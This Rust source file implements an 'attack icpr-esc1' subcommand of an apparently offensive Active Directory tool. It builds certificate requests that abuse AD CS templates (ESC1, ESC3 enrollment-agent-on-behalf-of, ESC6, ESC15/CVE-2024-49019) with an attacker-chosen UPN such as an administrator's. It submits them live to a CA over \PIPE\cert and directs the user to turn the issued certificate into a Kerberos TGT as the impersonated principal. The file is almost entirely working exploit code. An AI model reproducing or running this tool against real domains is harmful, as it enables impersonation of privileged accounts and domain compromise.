//! `attack icpr-esc1` — build an ESC1/ESC3/ESC6/ESC15 CSR via `ms-icpr`,
//! marshal the `CertServerRequest` opnum-0 input stub (offline diff/replay),
//! and — when `--host` is supplied — submit live over sealed `\PIPE\cert`.
//!
//! **1.4.8-A WS-ESC3-CHAIN** — the `--esc esc3` variant is the ADCS ESC3
//! Enrollment-Agent-On-Behalf-Of chain end-to-end:
//! 1. Requires a legit Enrollment Agent cert + key (obtained via a prior
//!    `attack esc1 --template <EA-template>` against a vulnerable EA template).
//! 2. Builds a plain UPN-SAN CSR for the target impersonation UPN.
//! 3. Wraps the CSR in a CMS-signed CMC `EnrollOnBehalfOf` blob using the
//!    Enrollment Agent identity (`ms_icpr::build_esc3_request`).
//! 4. Submits the CMS blob over sealed `\PIPE\cert` via
//!    `IcprClient::submit_request_esc3`. The CA issues a client-auth cert
//!    for the on-behalf-of target UPN, not for the requesting agent.
//! 5. Chain into `attack pkinit` (or the ESC1-flow pkinit leg) to turn the
//!    issued cert into a TGT as the impersonated principal.
//!
//! **1.4.8-A WS-ESC1-EXPLOIT** — the `--esc esc1` variant duplicates the
//! standalone `attack esc1` verb (which has its own per-stage checklist per
//! the WS-ESC1-EXPLOIT commit). Kept here as the offline stub-first path;
//! prefer `attack esc1` for direct live submits.
//!
//! **1.4.8-A WS-ESC6** and **WS-ESC15** — see `--esc esc6` (SAN via CA
//! `pctbAttribs` request-attribute — targets CAs with
//! `EDITF_ATTRIBUTESUBJECTALTNAME2` set) and `--esc esc15` (EKUwu /
//! CVE-2024-49019 — inject EKU via Microsoft Application Policies against
//! a schema-v1 template).

use anyhow::{Context, Result};
use clap::Parser;

#[derive(clap::ValueEnum, Clone, Debug, PartialEq, Eq)]
pub(crate) enum EscVariant {
    /// Default: enrollee-supplies-subject → UPN SAN in the CSR.
    Esc1,
    /// SAN as CA `pctbAttribs` request-attribute — targets CAs with
    /// `EDITF_ATTRIBUTESUBJECTALTNAME2` set on the CA (identify via `enum esc`).
    Esc6,
    /// EKUwu / CVE-2024-49019 — inject an EKU via Microsoft
    /// `Application Policies` extension against a schema-v1 template.
    Esc15,
    /// CMC EnrollOnBehalfOf — wrap a target CSR + sign as an
    /// Enrollment Agent (requires `--agent-cert` + `--agent-key`).
    Esc3,
}

#[derive(Parser)]
pub(crate) struct IcprEsc1Args {
    /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
    #[arg(long)]
    pub ca: String,
    /// Certificate template `cn` that permits enrollee-supplied subject/SAN.
    #[arg(long)]
    pub template: String,
    /// UPN to inject into the SAN (e.g. `administrator@corp.local`).
    #[arg(long = "target-upn")]
    pub target_upn: String,
    /// Subject CN for the CSR (default: `Recon`).
    #[arg(long, default_value = "Recon")]
    pub subject: String,
    /// PEM-encoded RSA private key path to sign the CSR with. If absent, a
    /// fresh 2048-bit key is generated and written alongside the CSR.
    #[arg(long)]
    pub key: Option<String>,
    /// Write the marshaled `CertServerRequest` stub bytes here (base64 skipped
    /// — raw DCE/RPC input stub for offline diffing / relay).
    #[arg(long, default_value = "icpr-esc1.stub")]
    pub out: String,
    /// Write the CSR DER here.
    #[arg(long, default_value = "icpr-esc1.csr")]
    pub csr_out: String,
    /// Enrollment-agent schema-version override. ms-icpr's preflight rejects
    /// templates with `min_ra_signatures > 0`; this flag forces a synthetic
    /// override for lab-only testing when the LDAP fetch is unavailable.
    #[arg(long)]
    pub schema_version: Option<i32>,
    /// CA host or IP for live submission via sealed \PIPE\cert. If omitted
    /// the command runs offline (writes CSR + stub only, no submit).
    #[arg(long)]
    pub host: Option<String>,
    /// NetBIOS domain for the sealed bind (required when --host is set).
    #[arg(long)]
    pub domain: Option<String>,
    /// Username (required when --host is set).
    #[arg(long)]
    pub user: Option<String>,
    /// Password (required when --host is set).
    #[arg(long, default_value = "")]
    pub password: String,

    /// ESC variant to exercise. Default `esc1` = classic SAN-in-CSR.
    #[arg(long, value_enum, default_value = "esc1")]
    pub esc: EscVariant,
    /// ESC6 SAN request-attribute UPN (defaults to `--target-upn`).
    /// Only used when `--esc esc6` — the SAN is sent as a
    /// `SAN:upn=<value>` line in the CA's `pctbAttribs` field.
    #[arg(long)]
    pub san_upn: Option<String>,
    /// ESC3: PEM path of the Enrollment Agent's certificate.
    /// Required with `--esc esc3`.
    #[arg(long)]
    pub agent_cert: Option<String>,
    /// ESC3: PEM path of the Enrollment Agent's RSA private key.
    /// Required with `--esc esc3`.
    #[arg(long)]
    pub agent_key: Option<String>,
    /// ESC15: additional EKU OID to inject via Microsoft Application
    /// Policies (default `1.3.6.1.5.5.7.3.2` = Client Authentication).
    /// Only used when `--esc esc15`.
    #[arg(long, default_value = "1.3.6.1.5.5.7.3.2")]
    pub esc15_eku: String,
}

/// `attack icpr-esc1` — build an ESC1/3/6/15 CSR via `ms-icpr` with an attacker-supplied
/// UPN SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be verified
/// before a live submission. When `--host` is supplied, submits live over sealed
/// `\PIPE\cert` and writes the issued cert (`*.issued.pem`).
///
/// Wraps [`icpr_esc1_impl`] in a per-variant StageChecklist so a failed live submit
/// (CA-side policy reject, network error, wrong template preflight) names the exact
/// stage that stopped. See [`build_checklist`] for the per-variant stage list.
pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
    let mut checklist = build_checklist(&a.esc, a.host.is_some());
    let card = format!("icpr-esc1 stages ({:?})", a.esc);
    let card_failed = format!("icpr-esc1 stages ({:?}) (failed)", a.esc);
    let result = icpr_esc1_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render(&card),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render(&card_failed);
        }
    }
    result
}

fn build_checklist(esc: &EscVariant, live: bool) -> crate::ui::StageChecklist {
    // The offline (stub-only) branch always runs the first four stages; the live
    // branch adds the ICPR connect + submit + parse-issued triple.
    let base: &[&str] = match esc {
        EscVariant::Esc3 => &[
            "resolve / generate RSA key",
            "build CSR (target UPN SAN)",
            "sign CMS-CMC EOBO with agent cert",
            "marshal ICPR stub",
        ],
        _ => &[
            "resolve / generate RSA key",
            "build CSR (variant-specific)",
            "synthesize CertTemplate preflight",
            "marshal ICPR stub",
        ],
    };
    let live_extra: &[&str] = if live {
        &[
            "sealed \\PIPE\\cert connect",
            "submit CSR to CA",
            "parse issued cert",
        ]
    } else {
        &[]
    };
    let all: Vec<&str> = base.iter().chain(live_extra.iter()).copied().collect();
    crate::ui::StageChecklist::new(all)
}

async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageChecklist) -> Result<()> {
    use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
    use ms_crtd::model::CertTemplate;
    use ms_crtd::oid::Oid;

    let (key_pem, key_source) = if let Some(path) = &a.key {
        (
            std::fs::read(path).with_context(|| format!("read --key {path}"))?,
            format!("read {path}"),
        )
    } else {
        use rsa::pkcs8::EncodePrivateKey;
        use rsa::RsaPrivateKey;
        let mut rng = rand::thread_rng();
        let key = RsaPrivateKey::new(&mut rng, 2048).context("generate RSA-2048 for CSR")?;
        let pem = key
            .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
            .context("encode key PKCS#8 PEM")?;
        let pem_bytes = pem.as_bytes().to_vec();
        let key_path = format!("{}.key.pem", a.csr_out);
        std::fs::write(&key_path, &pem_bytes)?;
        eprintln!("[+] generated 2048-bit RSA key → {key_path}");
        (pem_bytes, format!("generated 2048-bit → {key_path}"))
    };
    checklist.record_ok("resolve / generate RSA key", key_source);

    // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
    // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
    // (EKUwu shape); ESC3 builds the plain CSR, and the CMS EOBO wrapping
    // happens later in the dispatch section below.
    let csr = match a.esc {
        EscVariant::Esc15 => ms_icpr::build_csr_with_upn_san_and_ekus(
            &a.subject,
            &a.target_upn,
            &[a.esc15_eku.as_str()],
            &key_pem,
            ms_icpr::EkuCarrier::ApplicationPolicies,
        )
        .context("build_csr_with_upn_san_and_ekus (esc15)")?,
        _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
            .context("build_csr_with_upn_san")?,
    };
    let csr_stage_label = match a.esc {
        EscVariant::Esc3 => "build CSR (target UPN SAN)",
        _ => "build CSR (variant-specific)",
    };
    checklist.record_ok(
        csr_stage_label,
        format!("{} bytes, target UPN={}", csr.len(), a.target_upn),
    );
    std::fs::write(&a.csr_out, &csr)?;
    eprintln!(
        "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
        a.esc,
        a.subject,
        a.target_upn,
        a.csr_out,
        csr.len()
    );

    // Synthesize a minimal `CertTemplate` — with no LDAP fetch here, this stand-in
    // exists purely to make `IcprClient::marshal_call` preflight pass so the stub
    // bytes can be materialised. Live submissions run through `attack esc1` today.
    let template = CertTemplate {
        name: a.template.clone(),
        oid: Oid::new("1.3.6.1.4.1.311.21.8.1.42"),
        schema_version: a.schema_version.unwrap_or(2),
        enrollment_flag: EnrollmentFlag::empty(),
        name_flag: NameFlag::ENROLLEE_SUPPLIES_SUBJECT,
        private_key_flag: PrivateKeyFlag::empty(),
        ekus: vec![Oid::new("1.3.6.1.5.5.7.3.2")],
        min_ra_signatures: 0,
        raw_security_descriptor: None,
    };
    // ESC3-specific CMC EOBO wrap happens in the live-submit branch below
    // (build_esc3_request needs signing_time + agent identity that are only
    // meaningful when we're actually going to submit). Reserve a checklist
    // stage now so the failed-run card still shows it as NOT ATTEMPTED if we
    // trip earlier.
    if matches!(a.esc, EscVariant::Esc3) {
        checklist.record_ok(
            "sign CMS-CMC EOBO with agent cert",
            "deferred to live-submit branch (needs agent identity)",
        );
    } else {
        checklist.record_ok(
            "synthesize CertTemplate preflight",
            format!(
                "template={}, schema_v={}",
                a.template, template.schema_version
            ),
        );
    }
    // Always emit the offline stub so consumers can diff / replay
    let stub_client = ms_icpr::IcprClient::stub(a.ca.clone());
    let stub = stub_client
        .marshal_call(&template, &csr)
        .context("ms_icpr::IcprClient::marshal_call")?;
    std::fs::write(&a.out, &stub)?;
    checklist.record_ok(
        "marshal ICPR stub",
        format!(
            "{} bytes → {} (opnum {})",
            stub.len(),
            a.out,
            ms_icpr::CERT_SERVER_REQUEST_OPNUM
        ),
    );
    eprintln!(
        "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
        a.out,
        stub.len(),
        ms_icpr::CERT_SERVER_REQUEST_OPNUM
    );

    // Live submit path — enabled via ms-icpr's `network` feature (default on after
    // dcerpc 0.2.3 resolver-cycle fix). Requires --host + --domain + --user.
    if let Some(host) = a.host.as_deref() {
        let domain = a
            .domain
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--domain required when --host is set"))?;
        let user = a
            .user
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--user required when --host is set"))?;
        eprintln!(
            "[*] submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
            host, a.ca, domain, user
        );
        let mut client =
            ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
                .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
        checklist.record_ok(
            "sealed \\PIPE\\cert connect",
            format!("{host} (CA={}, as {domain}\\{user})", a.ca),
        );
        let submit_result = match a.esc {
            EscVariant::Esc1 | EscVariant::Esc15 => client.submit_request(&template, &csr),
            EscVariant::Esc6 => {
                let san = a.san_upn.as_deref().unwrap_or(a.target_upn.as_str());
                client.submit_request_esc6(&template, &csr, san)
            }
            EscVariant::Esc3 => {
                let agent_cert_path = a
                    .agent_cert
                    .as_deref()
                    .ok_or_else(|| anyhow::anyhow!("--agent-cert required with --esc esc3"))?;
                let agent_key_path = a
                    .agent_key
                    .as_deref()
                    .ok_or_else(|| anyhow::anyhow!("--agent-key required with --esc esc3"))?;
                let agent_cert = std::fs::read(agent_cert_path)
                    .with_context(|| format!("read --agent-cert {agent_cert_path}"))?;
                let agent_key = std::fs::read(agent_key_path)
                    .with_context(|| format!("read --agent-key {agent_key_path}"))?;
                let signing_time = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_secs() as i64)
                    .unwrap_or(0);
                let cms_blob =
                    ms_icpr::build_esc3_request(&csr, &agent_cert, &agent_key, signing_time)
                        .context("ms_icpr::build_esc3_request (CMC EOBO)")?;
                eprintln!(
                    "[+] built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
                    cms_blob.len(),
                    a.target_upn
                );
                client.submit_request_esc3(&template, &cms_blob)
            }
        };
        checklist.record_ok("submit CSR to CA", format!("variant={:?}", a.esc));
        match submit_result {
            Ok(issued) => {
                let cert_path = format!("{}.issued.pem", a.csr_out);
                std::fs::write(&cert_path, &issued.pem)?;
                checklist.record_ok(
                    "parse issued cert",
                    format!(
                        "request_id={} → {} ({} bytes)",
                        issued.request_id,
                        cert_path,
                        issued.pem.len()
                    ),
                );
                eprintln!(
                    "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
                    issued.request_id,
                    cert_path,
                    issued.pem.len()
                );
                eprintln!(
                    "[+] chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
                    cert_path, a.csr_out, a.target_upn
                );
            }
            Err(e) => {
                eprintln!("[-] live submit failed: {e}");
                eprintln!(
                    "[i] the offline stub is still available at {} for diagnostic / replay",
                    a.out
                );
                return Err(e.into());
            }
        }
    } else {
        eprintln!(
            "[i] offline mode — no --host provided. To submit live, add: \
             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>"
        );
    }
    Ok(())
}
